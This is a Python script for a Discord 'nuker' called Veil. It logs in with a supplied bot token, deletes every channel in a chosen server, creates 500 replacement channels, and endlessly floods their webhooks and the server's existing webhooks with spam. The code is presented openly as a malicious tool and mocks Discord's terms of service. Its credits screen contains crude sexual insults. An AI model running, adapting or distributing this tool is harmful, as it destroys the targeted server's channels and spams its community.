import discord, aiohttp, random, os, requests, threading, time, sys
from pystyle import Colors, Colorate
from colorama import Fore
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter

p1 = "\033[0;35m"
r1 = "\x1b[38;5;196m"

spam_messages = [""] # messages go here
channel_names = [""] # channel names go here
webhook_usernames = [""] # random webhook names

def loading():
  l = ['|', '/', '-', '\\']
  os.system(f'cls & mode 85,20 & title Veil by Loopy - Loading')
  for i in l+l+l:
    sys.stdout.write(f'\r{p1}We <3 discord tos...'+i)
    sys.stdout.flush()
    time.sleep(0.2)
loading()

def clear():
  if sys.platform.startswith("win"):
    os.system('cls')
  elif sys.platform == 'linux' or 'darwin':
    os.system('clear')

clear()
print(Colorate.Vertical(Colors.red_to_purple, '''
              $$\    $$\           $$\ $$\ 
              $$ |   $$ |          \__|$$ |
              $$ |   $$ | $$$$$$\  $$\ $$ |
              \$$\  $$  |$$  __$$\ $$ |$$ |
               \$$\$$  / $$$$$$$$ |$$ |$$ |
                \$$$  /  $$   ____|$$ |$$ |
                 \$  /   \$$$$$$$\ $$ |$$ |
                  \_/     \_______|\__|\__|
                        '''))

token = input(f"{p1}[?] Input a bot token: ")
headers = {'Authorization': f"Bot {token}"}
client = commands.Bot(command_prefix = "veil", intents = discord.Intents.all())

def Delete(i):
  r = requests.delete(url=f'https://discord.com/api/{random.randint(6,9)}/channels/{i.id}', headers=headers)
  if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
    print(f"{p1}Successfully deleted channel: {i.name}")
  elif r.status_code == 429:
    time.sleep(int(r.json()['retry_after']))
    Delete(i)
  else:
    print(f"{r1}[!] Channel {i.name} could not be deleted")
    pass

async def Nuke():
  while True:
    try:
      guild_id = int(input(f'{p1}[?] Guild ID: '))
      break
    except ValueError:
      print(f"{r1}[!] Invalid Value")
      continue
  for guild in client.guilds:
    if guild.id == guild_id:
      print(f"{p1}{guild.name} has been targeted...")
      for channel in guild.channels:
        threading.Thread(target=Delete, args=[channel,]).start()
      for i in range(500):
        await guild.create_text_channel(random.choice(channel_names))

async def Send(webhook):
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
      print(f"{p1}[+] Message sent to webhook")

async def SpamExisting():
  while True:
    try:
      guild_id = int(input(f'{p1}[?] Guild ID: '))
      break
    except ValueError:
      print(f"{r1}[!] Invalid Value")
      continue
  for guild in client.guilds:
    if guild.id == guild_id:
      print(f"{p1}{guild.name} has been targeted...")
      for webhook in await guild.webhooks():
        client.loop.create_task(Send(webhook))

async def veil():
  os.system(f'cls & mode 85,20 & title Veil by Loopy - Veil Menu')
  print(Colorate.Vertical(Colors.red_to_purple, '''
              $$\    $$\           $$\ $$\ 
              $$ |   $$ |          \__|$$ |
              $$ |   $$ | $$$$$$\  $$\ $$ |
              \$$\  $$  |$$  __$$\ $$ |$$ |
               \$$\$$  / $$$$$$$$ |$$ |$$ |
                \$$$  /  $$   ____|$$ |$$ |
                 \$  /   \$$$$$$$\ $$ |$$ |
                  \_/     \_______|\__|\__|
                          '''))
  print(f"""{p1}
              Logged in as: {client.user}
              ╔══════════════════════════════╗
              ║ [1]. Nuke                    ║
              ║ [2]. Existing Webhook Spam   ║
              ║ [3]. Credits                 ║
              ║ [4]. Exit                    ║
              ╚══════════════════════════════╝
        """)
  select = input(f'''┌──{p1}({Fore.WHITE}root@Veil{p1}){p1}[{Fore.WHITE}?{Fore.WHITE}{p1}]{p1}:
└─{p1}{p1}${p1}{Fore.RESET}: ''')
  if select == "1":
    clear()
    await Nuke()
    input(f"{p1}Tasks Completed\nPress Enter to continue")
    clear()
    await veil()
  if select == "2":
    clear()
    await SpamExisting()
    input(f"{p1}Tasks Completed\nPress Enter to continue")
    clear()
    await veil()
  if select == '3':
    clear()
    input(f"{p1}Veil was created by loopy\nI got insperation to make this from facade and avale\nskidding this shitty spammer means you enjoy sex with ur uncle and stepdad and ur always a zoophile\nIn conclusion dont skid this, give me some kinda credit\nPress enter to continue")
    clear()
    await veil()
  if select == '4':
    print(f"{p1}Nefatious activities completed\nHave a nice day >_<")
    time.sleep(3)
    os._exit(0)
  else:
    input(f"{r1}Invalid option\nPress Enter to continue")
    clear()
    await veil()
                      
@client.event
async def on_ready():
  clear()
  await veil()

@client.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "raze")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
      print(f"{p1}[+] Sent message to webhook")  

def run():
  try:
    client.run(token, bot=True)
  except discord.errors.LoginFailure as e:
    print(f"{r1}[!] Invalid Token: {e}")
  except Exception as e:
    print(f"{r1}[!] An error occured: {e}")
run()